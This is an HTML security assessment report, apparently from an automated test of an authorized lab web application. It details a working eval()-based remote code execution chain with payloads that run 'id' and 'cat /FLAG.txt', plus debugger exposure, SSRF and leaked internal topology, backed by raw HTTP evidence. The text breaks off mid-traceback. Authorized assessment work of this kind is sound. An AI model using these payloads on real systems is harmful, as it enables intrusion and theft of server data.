@@ -1,0 +1,1391 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqz0hv91-42biuu</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [rce] Server-Side RCE via eval() of attacker-controlled script (name/set → /app chain)</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [misconfig] Werkzeug Debugger Exposed in Production — SECRET and Stack Traces Leaked</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#d32f2f">HIGH</span> [ssrf] Unauthenticated SSRF via /api/set — Server fetches arbitrary internal URLs</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#f57c00">MEDIUM</span> [info-disclosure] Dashboard exposes internal service topology and target file path</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#c9a227">LOW</span> [info-disclosure] Internal service topology exposed in HTML comments on /app</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqz0hv91-42biuu</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32866/</code></td></tr>
+<tr><td>Started</td><td>2026-06-29T09:25:00.931Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>20 mapped · 19 scanned · 1 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>5</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32866</code>, <code>target.local:32867</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>5 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#d32f2f">2</b> high</span><span><b style="color:#f57c00">1</b> medium</span><span><b style="color:#c9a227">1</b> low</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [rce] Server-Side RCE via eval() of attacker-controlled script (name/set → /app chain)</h3>
+<div class="kv">Screen: <code>s-0011</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32866/</div>
+<div class="desc">The Flask App (flask_app:8080, proxied at /app/) fetches the value stored at the configured &quot;API URL&quot; (default: http://nginx:80/name/get), JSON-parses the response body, extracts the &quot;script&quot; key, and calls Python eval() on its value. An unauthenticated attacker can inject an arbitrary Python expression by: (1) calling /name/set?name={&quot;script&quot;:&quot;&lt;payload&gt;&quot;} to store a JSON object as the name, then (2) triggering GET /app. The app calls eval(__import__('os').popen('id').read()) and returns the OS command output in the HTML response body. No authentication, PIN, or other control protects either step.</div>
+<div><b>Reproduction</b></div><pre>1. Store a malicious Python expression as the name: GET /name/set?name={&quot;script&quot;:&quot;__import__('os').popen('id').read()&quot;}
+2. Trigger Flask App evaluation: GET /app
+3. Response contains &lt;div class=&quot;result&quot;&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/div&gt;
+4. Replace payload with __import__('os').popen('cat /FLAG.txt').read() to exfiltrate the flag file.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz3wb2q-9q</code> — <code>artifacts/s-0011/ev-mqz3wb2q-9q/</code></div><div class="lbl">REQUEST</div><pre>GET /app HTTP/1.1
+Host: target.local:32866
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: keep-alive
+content-length: 1028
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 11:00:13 GMT
+server: nginx/1.31.2
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Smart API Nanoservice&lt;/title&gt;
+    &lt;style&gt;
+        body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    margin: 40px;
+    }
+
+    .status {
+        margin-bottom: 20px;
+        font-size: 24px;
+    }
+
+    .result {
+        margin-bottom: 20px;
+        font-size: 20px;
+        color: green;
+    }
+
+    footer {
+        position: fixed;
+        bottom: 0;
+        width: 100%;
+        background-color: #f0f0f0;
+        font-size: 14px;
+        text-align: center;
+        padding: 10px;
+    }
+
+
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;result&quot;&gt;2&lt;/div&gt;
+    &lt;footer&gt;
+
+        &lt;!-- http://nginx/api/get http://nginx/api/set?url=value --&gt;
+        &lt;small&gt;api: http://nginx:80/name/get&lt;/small&gt;&lt;br&gt;
+        &lt;!-- http://nginx/name/get http://nginx/name/set?name=value --&gt;
+        &lt;small&gt;name: {&amp;#34;script&amp;#34;:&amp;#34;1+1&amp;#34;}&lt;/small&gt;
+    &lt;/footer&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz3wbkb-9s</code> — <code>artifacts/s-0011/ev-mqz3wbkb-9s/</code></div><div class="lbl">REQUEST</div><pre>GET /app HTTP/1.1
+Host: target.local:32866
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: keep-alive
+content-length: 1114
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 11:00:13 GMT
+server: nginx/1.31.2
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Smart API Nanoservice&lt;/title&gt;
+    &lt;style&gt;
+        body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    margin: 40px;
+    }
+
+    .status {
+        margin-bottom: 20px;
+        font-size: 24px;
+    }
+
+    .result {
+        margin-bottom: 20px;
+        font-size: 20px;
+        color: green;
+    }
+
+    footer {
+        position: fixed;
+        bottom: 0;
+        width: 100%;
+        background-color: #f0f0f0;
+        font-size: 14px;
+        text-align: center;
+        padding: 10px;
+    }
+
+
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;result&quot;&gt;uid=0(root) gid=0(root) groups=0(root)
+&lt;/div&gt;
+    &lt;footer&gt;
+
+        &lt;!-- http://nginx/api/get http://nginx/api/set?url=value --&gt;
+        &lt;small&gt;api: http://nginx:80/name/get&lt;/small&gt;&lt;br&gt;
+        &lt;!-- http://nginx/name/get http://nginx/name/set?name=value --&gt;
+        &lt;small&gt;name: {&amp;#34;script&amp;#34;:&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;id&amp;#39;).read()&amp;#34;}&lt;/small&gt;
+    &lt;/footer&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz3wc1y-9u</code> — <code>artifacts/s-0011/ev-mqz3wc1y-9u/</code></div><div class="lbl">REQUEST</div><pre>GET /app HTTP/1.1
+Host: target.local:32866
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: keep-alive
+content-length: 1114
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 11:00:14 GMT
+server: nginx/1.31.2
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Smart API Nanoservice&lt;/title&gt;
+    &lt;style&gt;
+        body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    margin: 40px;
+    }
+
+    .status {
+        margin-bottom: 20px;
+        font-size: 24px;
+    }
+
+    .result {
+        margin-bottom: 20px;
+        font-size: 20px;
+        color: green;
+    }
+
+    footer {
+        position: fixed;
+        bottom: 0;
+        width: 100%;
+        background-color: #f0f0f0;
+        font-size: 14px;
+        text-align: center;
+        padding: 10px;
+    }
+
+
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;result&quot;&gt;uid=0(root) gid=0(root) groups=0(root)
+&lt;/div&gt;
+    &lt;footer&gt;
+
+        &lt;!-- http://nginx/api/get http://nginx/api/set?url=value --&gt;
+        &lt;small&gt;api: http://nginx:80/name/get&lt;/small&gt;&lt;br&gt;
+        &lt;!-- http://nginx/name/get http://nginx/name/set?name=value --&gt;
+        &lt;small&gt;name: {&amp;#34;script&amp;#34;:&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;id&amp;#39;).read()&amp;#34;}&lt;/small&gt;
+    &lt;/footer&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [misconfig] Werkzeug Debugger Exposed in Production — SECRET and Stack Traces Leaked</h3>
+<div class="kv">Screen: <code>s-0009</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32866/</div>
+<div class="desc">The Flask application at GET /app is running with Werkzeug's built-in development debugger enabled in a production environment. Every exception response serves the full Werkzeug Debugger HTML page, which leaks: (1) the debugger secret key `***REDACTED***` embedded in every response, (2) full Python stack traces including source file paths and source code snippets, (3) Flask/Werkzeug library versions and internal Python paths. Although EVALEX=false (interactive REPL console disabled), the debugger is publicly accessible without authentication, exposing significant internal implementation detail. The app also calls requests.get('canary') on every request, confirming an HTTP-fetch sink in the codebase — live SSRF via request params was not confirmed during this assessment.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32866/app (no trailing slash)
+2. Observe HTTP 500 with Werkzeug Debugger HTML page
+3. In the embedded &amp;lt;script&amp;gt; block find: SECRET = &quot;***REDACTED***&quot;
+4. Observe full Python traceback with source paths under /usr/local/lib/python3.8/
+5. Repeatable on every request to this endpoint</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz2w5tk-6s</code> — <code>artifacts/s-0009/ev-mqz2w5tk-6s/</code></div><div class="lbl">REQUEST</div><pre>GET /app/eval HTTP/1.1
+Host: target.local:32866
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: keep-alive
+content-length: 207
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 10:32:06 GMT
+server: nginx/1.31.2
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz2xe1g-6z</code> — <code>artifacts/s-0009/ev-mqz2xe1g-6z/</code></div><div class="lbl">REQUEST</div><pre>GET /app?__debugger__=yes&amp;cmd=debugger&amp;frm=0&amp;s=***REDACTED*** HTTP/1.1
+Host: target.local:32866
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE (truncated)</div><pre>HTTP/1.1 500
+connection: keep-alive
+content-length: 22325
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 10:33:04 GMT
+server: nginx/1.31.2
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+  &lt;head&gt;
+    &lt;title&gt;requests.exceptions.MissingSchema: Invalid URL &amp;#39;canary&amp;#39;: No scheme supplied. Perhaps you meant https://canary?
+ // Werkzeug Debugger&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=style.css&quot;&gt;
+    &lt;link rel=&quot;shortcut icon&quot;
+        href=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=console.png&quot;&gt;
+    &lt;script src=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=debugger.js&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;
+      var CONSOLE_MODE = false,
+          EVALEX = false,
+          EVALEX_TRUSTED = false,
+          SECRET = &quot;***REDACTED***&quot;;
+    &lt;/script&gt;
+  &lt;/head&gt;
+  &lt;body style=&quot;background-color: #fff&quot;&gt;
+    &lt;div class=&quot;debugger&quot;&gt;
+&lt;h1&gt;MissingSchema&lt;/h1&gt;
+&lt;div class=&quot;detail&quot;&gt;
+  &lt;p class=&quot;errormsg&quot;&gt;requests.exceptions.MissingSchema: Invalid URL &amp;#39;canary&amp;#39;: No scheme supplied. Perhaps you meant https://canary?
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;h2 class=&quot;traceback&quot;&gt;Traceback &lt;em&gt;(most recent call last)&lt;/em&gt;&lt;/h2&gt;
+&lt;div class=&quot;traceback&quot;&gt;
+  &lt;h3&gt;&lt;/h3&gt;
+  &lt;ul&gt;&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562273447488&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1498&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;__call__&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;) -&amp;gt; cabc.Iterable[bytes]:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;The WSGI server calls the Flask application object as the&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;WSGI application. This calls :meth:`wsgi_app`, which can be&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;wrapped to apply middleware.&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.wsgi_app(environ, start_response)&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562273446144&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1476&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;wsgi_app&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;ctx.push()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.full_dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = e&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.handle_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except:  # noqa: B001&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = sys.exc_info()[1]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;raise&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;return response(environ, start_response)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;finally:&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562273447376&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1473&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;wsgi_app&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;ctx = self.request_context(environ)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;error: BaseException | None = None&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;ctx.push()&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.full_dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = e&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.handle_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except:  # noqa: B001&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = sys.exc_info()[1]&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562273446256&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;882&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;full_dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;request_started.send(self, _async_wrapper=self.ensure_sync)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.preprocess_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if rv is None:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;rv = self.dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.handle_user_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.finalize_request(rv)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def finalize_request(&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self,&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;rv: ft.ResponseReturnValue | HTTPException,&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562273446704&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;880&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;full_dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;request_started.send(self, _async_wrapper=self.ensure_sync)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.preprocess_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if rv is None:&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;rv = self.dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.handle_user_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.finalize_request(rv)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def finalize_request(&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562273447264&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;865&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;and req.method == &amp;#34;OPTIONS&amp;#34;&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;):&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;return self.make_default_options_response()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;# otherwise dispatch to the handler for that endpoint&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def full_dispatch_request(self) -&amp;gt; Response:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;Dispatches the request and on top of that performs request&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;pre and postprocessing as well as HTTP exception catching and&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;error handling.&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562273445472&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/app/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;10&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;home&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source &quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;app = Flask(__name__)&lt;/pre&gt;
